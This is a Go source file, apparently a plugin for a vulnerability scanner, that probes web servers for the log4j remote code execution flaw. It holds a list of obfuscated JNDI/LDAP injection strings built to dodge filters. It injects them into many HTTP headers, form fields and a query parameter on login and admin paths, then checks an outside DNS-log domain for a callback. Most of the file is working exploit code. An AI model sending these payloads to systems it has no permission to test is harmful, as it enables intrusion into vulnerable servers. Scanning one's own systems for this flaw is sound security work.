package mypocs

import (
	"fmt"
	plugin "github.com/deenrookie/kunpeng-plus/pocs"
	"github.com/deenrookie/kunpeng-plus/utils"
	"github.com/opensec-cn/kunpeng/util"
	"net/http"
	"strings"
	"time"
)

type log4jRCE struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("log4j", &log4jRCE{})
}

func (d *log4jRCE) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "log4j RCE",
		Remarks: "log4j 远程命令执行",
		Level:   0,
		Type:    "RCE",
		Author:  "Deen",
		References: plugin.References{
			URL:  "https://www.anquanke.com/post/id/262670",
			CVE:  "",
			KPID: "KP-1002",
		},
	}
	return d.info
}

func (d *log4jRCE) GetResult() []plugin.Plugin {
	var result = d.result
	d.result = []plugin.Plugin{}
	return result
}

func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
	_ = meta
	// count := 0
	randStr := utils.RandStringRunes(10)
	payloads := []string{
		"${j${::-}n${::-}d${::-}i:l${::-}d${::-}a${::-}p://",
		"${jndi:lda${:-}p://",
		"${j${aaa::::-n}di:ldap://}",
		"${j${aaa::::-n}d${:-}i:ldap://}",
		"${j${aaa::::-n}d${:-}i:ldap://}",
		"${j${:-}n${:-}d${:-}i:l${:-}d${:-}a${:-}p://",
	}

	reqPaths := []string{
		"/admin",
		"/login",
		"/signin",
	}

	headers := []string{
		"Origin",
		"Referer",
	}

	methods := []string{
		"GET",
		"POST",
	}

	//client := http.Client{
	//	//Transport: &http.Transport{
	//	//	// 设置代理
	//	//	Proxy: http.ProxyURL(uri),
	//	//},
	//}
	// fmt.Println(randStr)

	for _, payload := range payloads {
		fullPayload := fmt.Sprintf("%s%s.%s/}?a", payload, randStr, utils.DNS_LOG_DOMAIN)
		for _, reqPath := range reqPaths {
			for _, method := range methods {
				var request *http.Request
				if method == "POST" {
					postData := fmt.Sprintf("payload=%s&username=%s&password=%s&character_encoding=UTF-8", fullPayload, fullPayload, fullPayload)
					request, _ = http.NewRequest(method, URL+reqPath, strings.NewReader(postData))
				} else {
					request, _ = http.NewRequest(method, URL+reqPath, nil)
				}
				// fmt.Println(count)
				for _, header := range headers {
					request.Header.Set(header, fullPayload)
					request.Header.Set("User-Agent", fullPayload)
					request.Header.Set("X-Forwarded-For", fullPayload)
					request.Header.Set("Client-ip", fullPayload)
					request.Header.Set("Cookie", fullPayload)
					request.Header.Set("Authorization", fullPayload)
					request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
					_, _ = util.RequestDo(request, false)
				}

				request, _ = http.NewRequest(method, URL+reqPath + "?id=" + fullPayload, nil)
				for _, header := range headers {
					request.Header.Set(header, fullPayload)
					request.Header.Set("User-Agent", fullPayload)
					request.Header.Set("X-Forwarded-For", fullPayload)
					request.Header.Set("Client-ip", fullPayload)
					request.Header.Set("Cookie", fullPayload)
					request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
					request.Header.Set("Authorization", fullPayload)
					_, _ = util.RequestDo(request, false)
				}
				// fmt.Println(count)
				// count++
				if utils.IsExistDNSLog(randStr) {
					result := d.info
					result.Response = "TEST"
					result.Request = "TEST"
					d.result = append(d.result, result)
					return true
				}
			}
		}

	}

	time.Sleep(time.Duration(6) * time.Second)

	if utils.IsExistDNSLog(randStr) {
		result := d.info
		result.Response = "TEST"
		result.Request = "TEST"
		d.result = append(d.result, result)
		return true
	}
	return false
}
